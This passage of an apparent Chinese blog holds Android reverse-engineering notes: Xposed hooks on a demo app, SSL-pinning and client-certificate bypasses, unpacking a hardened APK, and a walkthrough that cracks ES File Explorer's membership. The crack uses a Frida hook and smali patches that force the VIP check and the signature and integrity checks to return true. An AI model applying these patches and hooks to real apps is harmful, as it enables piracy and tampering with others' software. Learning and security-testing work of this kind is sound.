class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        Method[] md=clazz.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;md.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,md[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">        Field[] fd=clazz.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;fd.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,fd[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;=======================&quot;</span>);</span><br><span class="line">        Class[] cls=clazz.getDeclaredClasses();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;cls.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,cls[i].getName());</span><br><span class="line">            Method[] mds=cls[i].getDeclaredMethods();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;mds.length;j++)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,mds[j].toString());</span><br><span class="line">            &#125;</span><br><span class="line">            Field[] fds=cls[i].getDeclaredFields();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;fds.length;j++)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,fds[j].toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是一个循环遍历，外层是遍历classes，内层输出每一个内部类的methods与fields</p><h3 id="执行结果-12">执行结果</h3><p>运行demo<br><img src="assets/image-20230716210145966.png" alt="image-20230716210145966"></p><h2 id="十四-遍历所有类">十四.遍历所有类</h2><h3 id="目标：遍历所有类">目标：遍历所有类</h3><h3 id="代码实现如下-13">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        XposedHelpers.findAndHookMethod(ClassLoader.class, <span class="string">&quot;loadClass&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Class clazz1=(Class)param.getResult();</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;LoadClass: &quot;</span>+clazz1.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要使用ClassLoader的loadClass方法，把抽象类ClassLoader字节化，调用下面的loadClass方法</p><ul><li>param.getResult()获得结果，即加载类</li><li>clazz1.getName()：获得加载类的名字</li></ul><h3 id="执行结果-13">执行结果</h3><p>打开demo<br><img src="assets/image-20230716221001521.png" alt="image-20230716221001521"></p><h2 id="十五-Hook所有类的所有方法">十五.Hook所有类的所有方法</h2><h3 id="目标：Hook所有类的所有方法">目标：Hook所有类的所有方法</h3><h3 id="代码实现如下-14">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        XposedHelpers.findAndHookMethod(ClassLoader.class, <span class="string">&quot;loadClass&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Class clazz=(Class)param.getResult();</span><br><span class="line">                String clazzName=clazz.getName();</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;LoadClass: &quot;</span>+clazzName);   <span class="comment">//输出类名</span></span><br><span class="line">                <span class="keyword">if</span> (clazzName.contains(<span class="string">&quot;com.xiaojianbang&quot;</span>))&#123;    <span class="comment">//过滤</span></span><br><span class="line">                    Method[] mds=clazz.getDeclaredMethods();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> i= <span class="number">0</span>; i &lt; mds.length; i++) &#123;</span><br><span class="line">                        <span class="keyword">final</span> Method md=mds[i];</span><br><span class="line">                        <span class="type">int</span> mod=mds[i].getModifiers();     <span class="comment">//获得这个方法的访问修饰符</span></span><br><span class="line">                        <span class="keyword">if</span>(!Modifier.isAbstract(mod)       <span class="comment">//不是抽象方法</span></span><br><span class="line">                           &amp;&amp; !Modifier.isNative(mod)      <span class="comment">//不是native方法</span></span><br><span class="line">                           &amp;&amp; !Modifier.isInterface(mod))&#123; <span class="comment">//不是接口</span></span><br><span class="line">                            XposedBridge.hookMethod(mds[i], <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;？、hook他</span><br><span class="line">                                <span class="meta">@Override</span></span><br><span class="line">                                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                                    <span class="keyword">if</span>(md.getName().contains(<span class="string">&quot;complexParameterFunc&quot;</span>))&#123;</span><br><span class="line">                                        <span class="type">int</span> paramNum=param.args.length;  <span class="comment">//参数长度</span></span><br><span class="line">                                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;paramNum ; i++) &#123;</span><br><span class="line">                                            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,param.args[i].getClass().getName());</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hook Method: &quot;</span>+md.toString());</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="执行结果-14">执行结果</h3><p>运行demo，我并没有运行出complexParameterFunc方法的参数啥的，不知道为什么。</p><p><img src="assets/image-20230717111721593.png" alt="image-20230717111721593"></p><p>按道理应该也会输出这个如下<img src="assets/image-20230717111832540.png" alt="image-20230717111832540"></p><h2 id="十六-Hook多dex">十六.Hook多dex</h2><h2 id="一些补充">一些补充</h2><h3 id="过滤子进程">过滤子进程</h3><p><code>LoadPackageParam.processName</code></p><h3 id="获得Context">获得Context</h3><p><code>Context context = AndroidAppHelper.currentApplication();</code></p><h3 id="获取对象">获取对象</h3><ul><li><p>hook的方式 ==》 params.thisobject</p></li><li><p>Class clazz=XposedHelpers.findClass(classname,loadPackageParam.classLoader);<br>Object obj=XposedHelpers.newInstance(clazz);<br>XposedHelpers.callMethod(obj,methodname);</p></li><li><p>Constructor cons = XposedHelpers.findConstructorExact(classname,loadPackageParam.classLoader)<br>Object obj = cons.newInstance();<br>XposedHelpers.callMethod(obj,methodname);</p></li><li><pre><code class="language-java">XposedBridge.hookAllMethod(clazz,Methodname,new XC_MethodHook()&#123;protected void afterHookedMethod(MethodHookParam param) throws Throwable&#123;        super.afterHookedMethod(param);        Object obj=param.thisObject;        XposedHelpers.callMethod(obj,methodname,args);&#125;&#125;)</code></pre></li><li></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>实操汇总</h1><p>逆向这个东西比较吃经验和实操的，但是懒得实操，呜呜呜… 闲的没事就在此篇记录中记录几个实战(可能只是复现，真自己解决一个问题，时间代价太大，现在耗不起时间了…)</p><p>在使用proguard混淆的时候，可以搭配 <code>renamesourcefileattribute AAA</code>使用 AAA来代替真正的类防止泄露信息</p><h1>App_Crack系列</h1><h2 id="ES文件浏览器">ES文件浏览器</h2><p>**实现功能：**可以使用会员一些功能及去掉弹窗Dialog</p><p>安装完app，如下图发现一个皇冠<br><img src="assets/image-20240713164526021.png" alt="image-20240713164526021"></p><p>点击后就是跳转开通会员的Activity</p><p>通过脚本跟踪一个这个点击事件，发现是<strong>es.g30$a</strong>，跟进看一下</p><p><img src="assets/image-20240713164740006.png" alt="image-20240713164740006"></p><p>想着看一看这个流程是怎么执行的(当然可以动态调式)，这里选择hook方式。</p><p>GDA右键方法有个hook选项，支持快速hook class和method。</p><p>hook D3方法看看str是多少。<br><img src="assets/image-20240713164953804.png" alt="image-20240713164953804"></p><p>同理对t2和D2hook下，看看返回的boolean值</p><p>t2:<br><img src="assets/image-20240713165119996.png" alt="image-20240713165119996"></p><p>D3<br><img src="assets/image-20240713165157806.png" alt="image-20240713165157806"></p><p>所有原流程是第二个if条件成立，执行ChinaMemberActivity.x1(g30.a(this.a), “fixed_home”);</p><p>尝试hook修改让他执行第二个子句看看是不是跳过会员注册，经过尝试并没有成功，依然跳到开通会员界面</p><p><img src="assets/image-20240713165341742.png" alt="image-20240713165341742"></p><p>那就跟进这个x1方法，hook这个类下的所有方法观察下</p><p>当进入会员开通界面，触发函数如下<br><img src="assets/image-20240713165529028.png" alt="image-20240713165529028"></p><p>当返回时，触发函数如下<br><img src="assets/image-20240713165545736.png" alt="image-20240713165545736"></p><p>手机界面此时如下：原界面处跳出一个弹窗<br><img src="assets/image-20240713165601178.png" alt="image-20240713165601178"></p><p>点击关闭，触发函数如下，也就是销毁界面，没啥用<br><img src="assets/image-20240713165633972.png" alt="image-20240713165633972"></p><p>所以这个ChinaMemberActivity类就是会员开通界面的实现</p><p>看了白天找不出关键点，然后换了一种方法，直接获得vip功能。</p><p>设置里，如图是需要vip才能使用的功能，随便点击他也会弹出让你开通会员的界面<br><img src="assets/image-20240713171254820.png" alt="image-20240713171254820"></p><p>同样打印一下onclick事件<br><img src="assets/image-20240713171450386.png" alt="image-20240713171450386"></p><p>跟一下这个路径<br><img src="assets/image-20240713171518943.png" alt="image-20240713171518943"></p><p>进H1</p><p><img src="assets/image-20240713171543558.png" alt="image-20240713171543558"></p><p>进j1<br><img src="assets/image-20240713171623369.png" alt="image-20240713171623369"></p><p>这里明显，只要让c50.m().s()返回真即可，这里frida一下，确实可以</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">s</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;es.c50&quot;</span>);</span><br><span class="line">        clazz.<span class="property">s</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">s</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这里也可以在跟进一下这个s函数，最后跟到这个</p><p><img src="assets/image-20240713171813063.png" alt="image-20240713171813063"></p><p>看来是从sharedPreferences中获取数据判断这个用户是不是vip，让这里返回true也可以的，这里选择修改一下这个p2的smali代码。然后重打包签名(apktool不行，使用MT管理器进行打包)</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span> p2()Z</span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line">   <span class="built_in"> const/4 </span>v0, 0x1</span><br><span class="line">   <span class="built_in"> return </span>v0<span class="keyword"></span></span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure><p>然后打开安装后(patch)的app，发现有个弹窗<br><img src="assets/image-20240713172238950.png" alt="image-20240713172238950"></p><p>这里选择去掉这个弹窗，弹窗可以从系统的AlertDialog和Dialog下手，通过测试发现并没有这些示例，可能这个弹窗没有使用系统的Dialog方法或者app自己实现的，这里通过搜索关键字来到如下位置</p><p><img src="assets/image-20240713172556805.png" alt="image-20240713172556805"></p><p>观察一下，很像是初始化弹窗的操作(论懂开发重要性)</p><p>hook这个类下的所有方法看看，这里选择使用objection，因为一打开app，弹窗已经实现了，用GDA支持的hook不能hook到这个生成弹窗过程。<br><img src="assets/image-20240713173038749.png" alt="image-20240713173038749"></p><p>发现 调用e.f()前还经过了这几个函数e.e(),e.c(),e.d()，会不会就是校验app是否正版的操作？？？</p><p>交叉引用一下f()<br><img src="assets/image-20240713173513964.png" alt="image-20240713173513964"></p><p>跟进一下这个类<br><img src="assets/image-20240713173619221.png" alt="image-20240713173619221"></p><p>发现就是调用了e.c()，还有个校验包名的操作，并且e.c()调用e.d()，e.d()<code>在其中验证了一些</code>android.os.Build<code>的信息；若相同则不判断签名和包名直接返回</code>true。而e.e()也是校验什么的样子。</p><p>所以这里只要让e.d()返回true就可以了。这里选择都修改</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> c()Z</span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line">   <span class="built_in"> const/4 </span>v0, 0x1</span><br><span class="line">   <span class="built_in"> return </span>v0<span class="keyword"></span></span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> d()Z</span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line">   <span class="built_in"> const/4 </span>v0, 0x1</span><br><span class="line">   <span class="built_in"> return </span>v0<span class="keyword"></span></span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure><p>但是还有一个输入密码的弹窗</p><p><img src="assets/image-20240713174459656.png" alt="image-20240713174459656"></p><p>输入账户密码也不正确(…)</p><p>刚开始通过&quot;输入密码&quot;，没发现端倪，</p><p>尝试点击事件， [WatchEvent] onClick: com.estrongs.android.ui.dialog.z1$i</p><p>发现就是dialog啊(有戏~)，跟进在看看。</p><p><img src="assets/image-20240713174849912.png" alt="image-20240713174849912"></p><p>看看z1类，一堆东西，看着像是一些初始化内容的东西，什么settitle，setButton。</p><p>向上看看发现一个类名，验证密码的弹框。<br><img src="assets/image-20240713175039084.png" alt="image-20240713175039084"></p><p>hook这下这个类，看看生成弹窗的时候有没有触发这里</p><p><strong>弹框出现：</strong></p><p><img src="assets/image-20240713175237974.png" alt="image-20240713175237974"></p><p>确实调用这里了，可能就是初始化这个弹框的操作，最后调用的j()可能就是触发弹框的操作</p><p>输入密码，确定</p><p><img src="assets/image-20240713175353528.png" alt="image-20240713175353528"></p><p>取消框框</p><p><img src="assets/image-20240713175413361.png" alt="image-20240713175413361"></p><p>这里可能就是关键，看看最后调用的j()函数，可能是触发弹框的函数。</p><p><img src="assets/image-20240713175457036.png" alt="image-20240713175457036"></p><p>还是个show()函数，八成是这里了，smali改一下，if-nez改为if-eqz，在MT管理器重打包。</p><p>最后成功</p><h1>抓包系列</h1><h2 id="复现-《Frida逆向与抓包实战》"><strong>复现 《Frida逆向与抓包实战》</strong></h2><p><strong>客户端校验服务端证书</strong></p><p>案例：dida.apk <code>滴答清单</code></p><p>打开这个apk进行手机号登录，发现登录失败，查看相应的数据包发现报错，如下图<img src="assets/image-20241024204618912.png" alt="image-20241024204618912"></p><p>客户端关闭了连接，应该是不相信服务端身份认证。</p><p>尝试用开源的工具看看能不能绕过。</p><p><strong>Objection</strong></p><p>使用 <code>objection -g cn.ticktick.task explore</code>命令后，再次抓包发现还是不行，</p><p><strong>ObjectionUnpinningPlus</strong></p><p><code>python DroidSSLUnpinning.py cn.ticktick.task </code></p><p>注入后仍然失败</p><p><img src="assets/image-20241024211521650.png" alt="image-20241024211521650"></p><p><strong>从网络框架入手</strong></p><p>不同框架有不同的证书绑定验证类，对这个熟悉我们就可以直接hook相应的方法来进行修改绕过证书校验。</p><p>如下图是okhttp3框架绑定的基本格式<img src="assets/image-20241024212841560.png" alt="image-20241024212841560"></p><p>证书绑定可能发生在开启app前就完成了，所以用-s参数完成打开app是就注入，看看一些开源工具能不能绕过证书绑定。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> -<span class="keyword">e</span> | <span class="keyword">grep</span> <span class="keyword">cn</span>.ticktick.task</span><br><span class="line">kill 进程号</span><br><span class="line">objection -g <span class="keyword">cn</span>.ticktick.task explore -s <span class="string">&quot;android sslpinning disable&quot;</span></span><br></pre></td></tr></table></figure><p>尝试抓包发现还是不行。</p><p>换一种思路：</p><p>如果是证书绑定，那么在进行校验时会使用File类打开一个文件，进行证书内容读取，所以hook File$init(在终端$是特殊字符要转义)</p><p><code>objection -g cn.ticktick.task explore -s &quot;android hooking watch class_method java.io.File.\$init --dump-args --dump-return --dump-backtrace&quot;</code></p><p>搜索<code>/system/etc/security/cacerts</code><img src="assets/image-20241024233810066.png" alt="image-20241024233810066"></p><p>发现<code>z1.g.a(CertificatePinner.java:13)</code></p><p>所以对其进行hook操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;z1.g&quot;</span>).<span class="property">a</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">str,list</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hooking...&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">            <span class="keyword">var</span> arrays = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.util.Arrays&#x27;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;content: &#x27;</span> + arrays.<span class="title function_">toString</span>(list.<span class="title function_">toArray</span>()));</span><br><span class="line">            <span class="comment">//console.log(list.toString());</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功抓到包</p><p><img src="assets/image-20241025001843319.png" alt="image-20241025001843319"></p><p><strong>服务端校验客户端证书</strong></p><p>apk解包，使用命令<code>tree -NCfhl |grep -i p12</code>搜索证书文件的后缀p12</p><p>或者</p><p>hook keyStore.load函数自吐证书文件</p><p>由于Charles只支持导入P12和PEM类型的证书文件。可以使用keystore.Exporer格式转化</p><p><strong>注意</strong>：在绕过证书后，发现https数据包仍是乱码，可能是因为案例apk使用非标准端口，只需在<code>Proxy→Proxy Settings</code>修改即可</p><h2 id="MobileCTF练习"><strong>MobileCTF</strong>练习</h2><h3 id="AndroidNetwork系列"><strong>AndroidNetwork</strong>系列</h3><h4 id="案例：便利蜂app">案例：<strong>便利蜂app</strong></h4><p>同样在登录界面进行抓包，结果如下：</p><p><img src="assets/image-20241025201323375.png" alt="image-20241025201323375"></p><p>发现是服务端校验客户端。</p><p>开源脚本先走一遍 hook证书</p><p><strong>使用<code>keystore.load</code></strong></p><p><img src="assets/image-20241025205013428.png" alt="image-20241025205013428"></p><p>尝试把它导入charles看一看是否成功绕过证书校验，使用<code>keystore-explorer</code>注意改证书格式</p><p>发现也可以绕过证书校验</p><p><strong>使用r0capture进行证书dump</strong></p><p>使用js脚本不能重定向输出，所以用py执行这个r0capture脚本。</p><p><code>python r0capture.py -U -f package -v</code>（注意要关掉vpn）</p><p>然后关键字搜索“dumpClinetCertificate”可以发现证书及密码，然后随便把一个p12证书pull出来导进抓包工具即可抓包。</p><p><img src="assets/image-20241025221326964.png" alt="image-20241025221326964"></p><p>接下来分析一下这个证书位置</p><p>通过前面的hook keystore.load的脚本可以看到一些调用栈：<img src="assets/image-20241026210407668.png" alt="image-20241026210407668"></p><p>发现在加载证书前有一些wormpex的操作，可以看一下这些地方。</p><p>打开jadx看一下java代码。<br><img src="assets/image-20241026210457757.png" alt="image-20241026210457757"></p><p>发现qihoo，明显是360的加固</p><p>先尝试脱壳</p><p><strong>frida-dexdump</strong></p><p><code>frida-dexdump -UF</code></p><p>发现报错了，有一些地方可能脱不下来或者脱不干净，看看脱下来的有没有自己需要的路径及方法。</p><p>通过<code>grep -ril &quot;wormpex&quot; *</code>和<code>grep -rli &quot;getKeyStore&quot;  *</code>找到在classes05.dex下</p><p>反编译他找到关键位置</p><p><img src="assets/image-20241026214257753.png" alt="image-20241026214257753"></p><p>发现是一个native函数，那就要看so层代码，如何找这个方法在哪个so中呢？</p><p>网上有个开源脚本<a href="https://github.com/Simp1er/MobileSec/blob/master/hook_RegisterNative.js">MobileSec/hook_RegisterNative.js at master · Simp1er/MobileSec · GitHub</a></p><p>描述如下：<img src="assets/image-20241026215104230.png" alt="image-20241026215104230"></p><p>调用这个脚本之后就可以找到某个方法具体在哪个so上面<br><img src="assets/image-20241026215726856.png" alt="image-20241026215726856"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 